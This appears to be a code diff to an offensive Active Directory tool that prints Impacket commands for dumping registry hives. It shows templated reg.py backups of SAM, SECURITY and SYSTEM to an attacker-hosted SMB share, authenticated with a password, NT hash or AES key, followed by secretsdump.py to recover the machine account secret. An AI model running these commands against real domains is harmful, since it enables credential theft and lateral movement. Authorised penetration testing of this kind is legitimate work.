@@ -957,10 +957,11 @@ class x_RegBackup(Action):
             plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
 
         comment = "Find an accessible share or create yours:"
-        cmd = "sudo smbserver.py -smb2support share ."
+        cmd = "sudo smbserver.py -smb2support MYSHARE ."
         print_line(comment, cmd, v)
 
         comment = [
+            "TODO: check before if there is a GPO which restrict the SeBackup privilege",
             "Backup SAM, SECURITY and SYSTEM",
             "Warning: if you put '-o .', it will write files into {target_no_dollar}/C$/Windows/System32!",
             "Access to registry hives can be monitored and alerted via event ID 4656 (A handle",
@@ -968,17 +969,17 @@ class x_RegBackup(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -k -no-pass backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -k -no-pass backup -o '\\\\{ip}\\MYSHARE'"
         elif parent.secret_type == c.T_SECRET_NTHASH:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -hashes :{parent.secret} backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -hashes :{parent.secret} backup -o '\\\\{ip}\\MYSHARE'"
         elif parent.secret_type == c.T_SECRET_AESKEY:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -k -aesKey {parent.secret} backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -k -aesKey {parent.secret} backup -o '\\\\{ip}\\MYSHARE'"
         elif parent.secret_type == c.T_SECRET_PASSWORD:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}:{parent.secret}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}:{parent.secret}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} backup -o '\\\\{ip}\\MYSHARE'"
 
         print_line(comment, cmd, v)
 
-        comment = "Extract secrets"
+        comment = "Extract secrets (take the $MACHINE.ACC:plain_password_hex)"
         cmd = "secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local"
         print_line(comment, cmd, v)
 
@@ -989,7 +990,7 @@ class x_BlankPassword(Action):
         print_comment("The password of {target.name} may be blank... or not", v)
 
 
-class x_CanRDP_SeBackupPrivilege_LATFP_or_RDP_required(Action):
+class x_CanRDP_plus_SeBackupPrivilege(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
         v = vars(glob, parent, target)
 
@@ -1009,7 +1010,7 @@ class x_CanRDP_SeBackupPrivilege_LATFP_or_RDP_required(Action):
 
         print_line(comment, cmd, v)
 
-        comment = "Extract secrets"
+        comment = "Extract secrets (take the $MACHINE.ACC:plain_password_hex)"
         cmd = "secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local"
         print_line(comment, cmd, v)
 
